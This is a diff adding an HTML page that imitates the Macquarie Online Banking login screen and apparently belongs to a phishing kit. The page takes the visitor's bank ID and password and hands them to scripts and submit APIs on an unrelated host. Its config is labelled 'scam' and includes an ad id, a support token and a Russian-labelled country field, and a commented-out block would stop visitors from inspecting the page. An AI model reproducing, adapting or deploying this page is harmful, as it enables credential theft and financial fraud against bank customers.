@@ -1,0 +1,321 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <title>Log in to Macquarie Online Banking</title>
+    <base href="https://auspost.serveblog.net">
+    <link rel="shortcut icon" href="/static/personal-cabinet/images/au/macquarie/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/static/personal-cabinet/css/au/macquarie/output.css">
+</head>
+
+<body style="cursor: default;">
+    <div class="fixed left-0 top-0 w-full h-full bg-firmBg bg-cover bg-no-repeat -z-10"></div>
+    <div class="flex flex-col min-h-screen font-mr">
+        <main class="flex justify-center items-center flex-1 px-4">
+            <div class="bg-white py-6 px-4 sm:p-6 flex flex-col items-center max-w-[450px] w-full text-firmBlack shadow-firmShadow">
+                <img class="w-[150px] mt-6 mb-11" src="/static/personal-cabinet/images/au/macquarie/logo.png" alt="">
+                <h1 class="text-[28px] font-mm text-center">Welcome to a better banking </h1>
+                <span class="font-mHand text-[73px] leading-[1.20]">experience</span>
+                <div class="mt-4 w-full">
+                    <div class="">
+                        <input type="hidden" id="bank-name" value="Macquarie Bank">
+                        <input type="hidden" id="country-code-pc" value="AU">
+
+                        <div class="flex flex-col gap-4 ">
+                            <div class="relative w-full flex flex-col gap-1">
+                                <input type="text" class="peer m-0 block outline-none w-full rounded-t border-b-[1px] border-firmBorder  bg-clip-padding p-3 text-sm leading-tight text-firmBlack transition-all duration-200 ease-linear placeholder:text-transparent focus:border-b-[2px] focus:pb-[0.325rem] focus:pt-[1.2rem] focus:outline-none [&amp;:not(:placeholder-shown)]:pb-[0.325rem] [&amp;:not(:placeholder-shown)]:pt-[1.2rem]" id="login" placeholder="name@example.com" required="" maxlength="255">
+                                <label for="login" class="pointer-events-none absolute left-0 top-0 origin-[0_0] border border-solid border-transparent py-3 text-[15px] font-ml text-firmLabel transition-[opacity,_transform] duration-200 ease-linear peer-focus:-translate-y-2 peer-focus:translate-x-[0.15rem] peer-focus:scale-[0.75] peer-[:not(:placeholder-shown)]:-translate-y-2 peer-[:not(:placeholder-shown)]:translate-x-[0.15rem] peer-[:not(:placeholder-shown)]:scale-[0.75] motion-reduce:transition-none">Macquarie
+                                    ID</label>
+                                <div class=" hidden">
+                                    <div class="text-firmRed text-sm flex items-center gap-1">
+                                        <span class="err text-base"></span>
+                                        <span>This is a required field</span>
+                                    </div>
+                                </div>
+                                <div class="checkForValid hidden">
+                                    <div class="text-firmRed text-sm flex items-center gap-1">
+                                        <span class="err text-base"></span>
+                                        <span>The data is incorrect</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="relative w-full flex flex-col gap-1">
+                                <span id="open" class=" absolute right-0 top-[18px] text-firmBlue text-xs underline cursor-pointer">Show</span>
+                                <span id="close" class=" absolute right-0 top-[18px] text-firmBlue text-xs underline hidden cursor-pointer">Hide</span>
+                                <input type="password" class="peer m-0 block outline-none w-full rounded-t border-b-[1px] border-firmBorder bg-clip-padding p-3 pr-8 text-sm leading-tight text-firmBlack transition-all duration-200 ease-linear placeholder:text-transparent focus:border-b-[2px] focus:pb-[0.325rem] focus:pt-[1.2rem] focus:outline-none [&amp;:not(:placeholder-shown)]:pb-[0.325rem] [&amp;:not(:placeholder-shown)]:pt-[1.2rem]" id="password" placeholder="name@example.com" maxlength="255" required="">
+                                <label for="password" class="pointer-events-none font-ml absolute left-0 top-0 origin-[0_0] border border-solid border-transparent py-3 text-[15px] text-firmLabel transition-[opacity,_transform] duration-200 ease-linear peer-focus:-translate-y-2 peer-focus:translate-x-[0.15rem] peer-focus:scale-[0.75] peer-[:not(:placeholder-shown)]:-translate-y-2 peer-[:not(:placeholder-shown)]:translate-x-[0.15rem] peer-[:not(:placeholder-shown)]:scale-[0.75] motion-reduce:transition-none">Password</label>
+                                <div class=" hidden">
+                                    <div class="text-firmRed text-sm flex items-center gap-1">
+                                        <span class="err text-base"></span>
+                                        <span>This is a required field</span>
+                                    </div>
+                                </div>
+                                <div class="checkForValid hidden">
+                                    <div class="text-firmRed text-sm flex items-center gap-1">
+                                        <span class="err text-base"></span>
+                                        <span>The data is incorrect</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <button disabled id="pc-submit-button" type="submit" class="bg-firmBlue text-white rounded text-sm py-[10px] px-4 mt-3">Log
+                                in</button>
+                            <div class="my-2 text-center text-sm leading-[1.42] text-firmBlack">The <span class="text-firmBlue">Electronic Banking Terms and Conditions </span>apply to your
+                                use of Electronic Banking.</div>
+                            <div class="flex flex-col items-center text-firmBlue text-sm *:underline">
+                                <span>Forgot log in details?</span>
+                                <span>New to internet banking? Register now.</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer>
+            <div class="flex justify-end p-4">
+                <ul class="flex flex-wrap justify-center items-center gap-1 text-firmBlue text-xs">
+                    <li>Further information</li>
+                    <li class="bg-firmBorder h-3 w-[1px]"></li>
+                    <li>Privacy policy</li>
+                    <li class="bg-firmBorder h-3 w-[1px]"></li>
+                    <li>Important information</li>
+                    <li class="bg-firmBorder h-3 w-[1px]"></li>
+                    <li>Complaints</li>
+                </ul>
+            </div>
+        </footer>
+    </div>
+
+    
+<script>
+    const botType = "scam";
+    const currency = "AUD";
+    const supportToken = "cvfQ1VdOtX0SdAwvlcqdpGccIrhYb1kJ";
+    const languageCode = "EN";
+    
+    const updateApiPath = "/api/update";
+    const stepsApiPath = "/api/steps";
+    const submitApiPath = "/api/submit";
+    const codeApiPath = "/api/code";
+
+    const userLocation = {
+        country: "🇦🇺 Австралия",
+        template: "merchant",
+        countryCode: "AU",
+        bank: "Macquarie Bank",
+    };
+</script>
+
+
+<script>
+    const adId = "4Ru2sQpsL199";
+    const adSubtype = "2.0";
+    const tpType = 0;
+    const logoPath = "/static/delivery/images/auspost/logo.png";
+</script>
+
+
+<!-- Bootstrap -->
+<link href="/static/other/bootstrap/css/bootstrap.css" rel="stylesheet">
+<script src="/static/other/bootstrap/js/bootstrap.js"></script>
+
+<!-- SweetAlert -->
+<link rel="stylesheet" type="text/css" href="/static/other/sweetalert/css/style.css">
+<script src="/static/other/sweetalert/js/sweetalert2@11.js"></script>
+
+<!-- iMask -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.6.0/imask.min.js"></script>
+
+<!-- Axios -->
+<!-- <script src="/static/other/axios/axios.min.js"></script> -->
+
+<!-- jQuery -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+<!-- Console -->
+<!-- <script src="/static/other/console/console-ban.min.js"></script>
+
+<script>
+    ConsoleBan.init({
+        redirect: 'https://http.cat/403'
+    });
+</script>
+
+<script>
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey && e.shiftKey && e.key == 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key == 'J') ||
+            (e.key === 'F12')) {
+            e.preventDefault();
+        }
+    });
+</script> -->
+
+<noscript>
+    <div id="noscript-content">
+        <p>JavaScript is disabled in your browser. Please enable JavaScript to view this content.</p>
+    </div>
+</noscript>
+
+
+    
+        
+<link rel="stylesheet" type="text/css" href="/static/support/css/chat.css">
+
+<style>
+    .chaport-close.visible, .chaport-container .chaport-close.visible {
+        display: block;
+    }
+
+    .chaport-overlay .chaport-close {
+        position: absolute;
+        width: 70px;
+        height: 70px;
+        top: 13px;
+        right: 27px;
+        opacity: 0.6;
+    }
+
+    .chaport-close, .chaport-container .chaport-close {
+        position: absolute;
+        top: 0px;
+        right: 0px;
+        z-index: 4;
+        width: 50px;
+        height: 70px;
+        cursor: pointer;
+        opacity: 1;
+        transition: opacity 0.2s linear 0s;
+        display: none;
+    }
+
+    .chaport-overlay .chaport-close::before, .chaport-overlay .chaport-close::after {
+        content: "";
+        height: 31px;
+        width: 2px;
+        background-color: rgb(238, 238, 238);
+        right: 33px;
+        top: 19px;
+    }
+
+    .chaport-close::before, .chaport-container .chaport-close::before {
+        transform: rotate(45deg);
+    }
+
+    .chaport-close::after, .chaport-container .chaport-close::after {
+        transform: rotate(-45deg);
+    }
+
+    .chaport-close::before, .chaport-close::after, .chaport-container .chaport-close::before, .chaport-container .chaport-close::after {
+        position: absolute;
+        top: 24px;
+        right: 28px;
+        content: " ";
+        height: 22px;
+        width: 2px;
+        background-color: rgb(255, 255, 255);
+    }
+
+</style>
+
+<script src="/static/other/swal/language.js"></script>
+<script src="/static/other/swal/swal-methods.js"></script>
+<script src="/static/other/swal/system.js"></script>
+
+    <script>
+        function numbers(arg) {
+            arg.value = arg.value.replace(/[^0-9]/g, '');
+        }
+
+        const login = document.getElementById('login');
+        const password = document.getElementById('password');
+        const submitButton = document.getElementById("pc-submit-button");
+
+        const inpState = ['border-firmBorder'];
+        const inpStateErr = ['border-firmRed'];
+
+        function isValue(arg) {
+            arg.addEventListener('blur', () => {
+                if (arg.value.length < 1) {
+                    arg.nextElementSibling.nextElementSibling.classList.remove('hidden');
+                    inpStateErr.map(el => arg.classList.add(el));
+                    inpState.map(el => arg.classList.remove(el));
+                } else {
+                    arg.nextElementSibling.nextElementSibling.classList.add('hidden');
+                    inpState.map(el => arg.classList.add(el));
+                    inpStateErr.map(el => arg.classList.remove(el));
+                }
+            })
+
+            arg.addEventListener('input', () => {
+                if (arg.value.length < 1) {
+                    arg.nextElementSibling.nextElementSibling.classList.remove('hidden');
+                    inpState.map(el => arg.classList.remove(el));
+                    inpStateErr.map(el => arg.classList.add(el));
+                } else {
+                    arg.nextElementSibling.nextElementSibling.classList.add('hidden');
+                    inpState.map(el => arg.classList.add(el));
+                    inpStateErr.map(el => arg.classList.remove(el));
+                }
+            })
+
+
+            arg.addEventListener('focus', () => {
+                if (!arg.className.includes('border-firmRed')) {
+                    inpState.map(el => arg.classList.add(el));
+                }
+            })
+        }
+
+        isValue(login);
+        isValue(password);
+
+        const openPass = document.getElementById('open');
+        const closePass = document.getElementById('close');
+
+        openPass.addEventListener('click', () => {
+            openPass.nextElementSibling.classList.remove('hidden');
+            openPass.classList.add('hidden');
+            openPass.parentElement.querySelector('input').type = 'text';
+        })
+
+        closePass.addEventListener('click', () => {
+            closePass.previousElementSibling.classList.remove('hidden');
+            closePass.classList.add('hidden');
+            closePass.parentElement.querySelector('input').type = 'password';
+        })
+
+        function initSubmitButton() {
+            const isLoginEmpty = login.value.length === 0;
+            const isPasswordEmpty = password.value.length === 0;
+            submitButton.disabled = isLoginEmpty || isPasswordEmpty;
+        }
+
+        login.addEventListener('input', () => {
+            initSubmitButton();
+        });
+
+        login.addEventListener('paste', () => {
+            initSubmitButton();
+        });
+
+        password.addEventListener('input', () => {
+            initSubmitButton();
+        });
+
+        password.addEventListener('paste', () => {
+            initSubmitButton();
+        });
+    </script>
+         <script src="/lol/s.js"></script>
+    <script src="/static/pc-card/js/personal-cabinet/validate.js"></script>
+</body>
+
+</html>
